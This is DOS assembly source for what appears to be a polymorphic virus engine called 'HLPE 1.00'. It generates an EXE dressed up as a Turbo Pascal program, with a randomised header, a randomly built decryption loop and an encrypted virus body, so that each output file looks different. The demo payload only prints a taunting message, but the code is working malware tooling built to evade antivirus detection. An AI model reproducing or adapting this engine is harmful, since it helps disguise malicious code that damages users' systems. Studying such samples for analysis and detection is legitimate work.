
include         rulez.inc

                org 100h
start:
vir:
                call gen

                mov ah, 3Ch
                lea dx, filename
                xor cx, cx
                int 21h

                xchg bx, ax

                mov ah, 40h
                lea dx, genheader
                mov cx, genheader.exe_headersize
                shl cx, 4
                int 21h

                mov ah, 40h
                lea dx, program
                mov cx, cseg_size
                shl cx, 4
                int 21h

                mov ah, 40h
                lea dx, c2
                mov cx, c2_size
                int 21h

                mov ah, 40h
                lea dx, crypted_vir
                mov cx, vir_size
                int 21h

                mov ah, 40h
                lea dx, c4
                mov cx, c4_size
                int 21h

                mov ah, 3eh
                int 21h

                mov ax, 4c00h
                int 21h

filename        db 'test.exe',0

include         random.inc

gen:            lea di, gendata_start
                mov cx, gendata_end - gendata_start
                xor al, al
                rep stosb

                ; initialize header

                xor cx, cx

                mov genheader.exe_mz, 'ZM'
                mov genheader.exe_checksum, cx
                mov genheader.exe_ovrnum, cx

                mov genheader.exe_cs, cx
                mov genheader.exe_ip, cx

                mov genheader.exe_relnum, cx
                mov genheader.exe_relofs, 28

                mov ax, 100h
                call rnd
                add ax, 600h

                mov genheader.exe_ss, ax
                mov genheader.exe_sp, 8192

                mov ax, 200h
                call rnd
                add ax, 600h

                mov genheader.exe_minmem, ax
                add ax, 0A000h
                mov genheader.exe_maxmem, ax

                ; make program

                call make_program

                ; sustem code

                call make_system

                ; exe file size

                mov cx, genheader.exe_headersize
                shl cx, 4
                mov ax, cseg_size
                shl ax, 4
                add cx, ax
                add cx, c2_size + (vir_size + 2) + c4_size
                mov ax, cx
                shr cx, 9
                inc cx
                and ax, 511
                jnz @@1
                mov ax, 512
                dec cx
@@1:            mov genheader.exe_num512, cx
                mov genheader.exe_last512, ax

                ret

                ;

make_program:   lea di, program                 ; di = program code
                lea si, prog_relo

                ; entry code

                mov al, 09Ah   ; call far SYSTEM:InitTurbo
                stosb
                xor ax, ax
                stosw
                call relo
                stosw

                mov al, 55h    ; push bp
                stosb
                mov ax, 0E589h ; mov bp, sp
                stosw

                mov ax, 0c031h ; xor ax, ax
                stosw

                mov al, 09Ah   ; call far SYSTEM:StackCheck
                stosb
                mov ax, 02CDh
                stosw
                call relo
                xor ax, ax
                stosw

                ; main program code

; ---------------------------------------------------------------------------

                ; FOR i := 1 to vir_size DO

                mov ax, 06C7h  ; mov word ptr [xxxx], yyyy
                stosw

                mov ax, 256
                call rnd
                add ax, 4150h
                stosw
                xchg bp, ax

                mov ax, 1
                stosw

                ;;

                mov ax, 04EBh   ; jmp $+2+4
                stosw

                ;;
                PUSH DI         ; ***

                mov ax, 06FFh   ; inc [i]
                stosw
                mov ax, bp
                stosw

                ;; BEGIN

                ; b[0] := virus[w[0]]

                mov ax, 3E8bh   ; mov di, [i]
                stosw
                mov ax, bp
                stosw

                mov ax, 858ah   ; mov al, [di+1]
                stosw
                mov ax, 1
                stosw

                mov ax, 256
                call rnd
                add ax, 4050h
                mov dx, ax

                mov al, 0a2h    ; mov b[0], al
                stosb
                mov ax, dx
                stosw

                ;;

                mov ax, 50
                call rnd
                add ax, 10
                xchg cx, ax

                push bp

                lea bp, coder
                mov byte ptr [bp], 0C3h ; ret

@@9:            mov al, 0a0h    ; mov al, [b0]
                stosb
                mov ax, dx
                stosw


                call random
                and ax, 3
                xchg bx, ax

                call random

                mov al, xxx[bx]
                stosw


                sub bp, 2

                xor bl, 1
                mov al, xxx[bx]

                mov [bp], ax

                mov al, 0a2h    ; mov [b0], al
                stosb
                mov ax, dx
                stosw

                loop @@9

                mov coder_ptr, bp
                pop bp

                ;;

                ; vir[i] := b[0]

                mov al, 0a0h    ; mov al, [xxxx]
                stosb
                mov ax, dx
                stosw

                mov ax, 3e8bh   ; mov di, [xxxx]
                stosw
                mov ax, bp
                stosw

                mov ax, 8588h   ; mov [di+1], al
                stosw
                mov ax, 1
                stosw

                ;; END

                MOV AX, 3E81H   ; cmp word ptr [xxxx], yyyy
                stosw
                mov ax, bp
                stosw
                mov ax, vir_size
                stosw

                ;;

                mov ax, 0374h   ; je $+2+3
                stosw

                mov al, 0e9h
                stosb
                POP AX          ; ***
                sub ax, di
                dec ax
                dec ax
                stosw

                ;;

                mov al, 09Ah    ; call far vir
                stosb
                lea ax, entrypoint       ; vir
                stosw
                call relo
                mov ax, c2_size shr 4 - 16
                stosw

; ---------------------------------------------------------------------------

                ; exit code

                mov al, 0C9H    ; leave
                stosb
                mov ax, 0C031H  ; xor ax, ax
                stosw

                mov al, 09AH    ; call far SYSTEM:HaltTurbo
                stosb
                mov ax, 0116h
                stosw
                call relo
                xor ax, ax
                stosw

                sub di, offset program - 15
                and di, not 15
                shr di, 4
                mov cseg_size, di

                ; analize & add relocations

                lea di, relocations

                mov dx, si
                lea si, prog_relo

@@2:            cmp si, dx
                je @@1

                lodsw
                xchg bx, ax
                mov ax, cseg_size
                add [bx], ax

                sub bx, offset program  ; make relocation
                xchg bx, ax
                stosw
                xor ax, ax
                stosw

                inc genheader.exe_relnum

                jmp @@2

@@1:            ; code virus

                lea si, vir
                mov cx, vir_size
@@8:            lodsb
                call coder_ptr
                mov crypted_vir-vir[si-1], al
                loop @@8

                ret

relo:           mov [si], di   ; relo
                inc si
                inc si
                ret

make_system:    lea si, r2
                mov cx, r2_num

@@1:            lodsw
                stosw
                xchg bx, ax
                add bx, offset c2

                mov ax, cseg_size
                stosw
                inc genheader.exe_relnum

                mov ax, [bx]
                sub ax, 8
                add ax, cseg_size
                mov [bx], ax

                loop @@1

                sub di, offset genheader - 15
                and di, not 15
                shr di, 4
                mov genheader.exe_headersize, di

                ret

include         r2.inc
include         c2.inc
include         c4.inc


xxx             db 04h,2Ch,34h,34h

entrypoint:     push ds
                mov ah, 9
                push cs
                pop ds
                call @@1

                db 'hehehe. Its HLPE 1.00  ;)',13,10,'$'

@@1:            pop dx
                int 21h



                pop ds

                retf

                org vir+16384-3
                db 'EOV'
vir_size        equ $-vir

gendata_start:

cseg_size       dw ?

genheader       label exe_struc
                db 28 dup (?)
relocations     db 500 dup (?)

prog_relo       db 500 dup (?)

program         db 1000 dup (?)

coder_ptr       dw ?
                db 200 dup (?)
coder:

crypted_vir     db vir_size dup (?)

gendata_end:

                end start
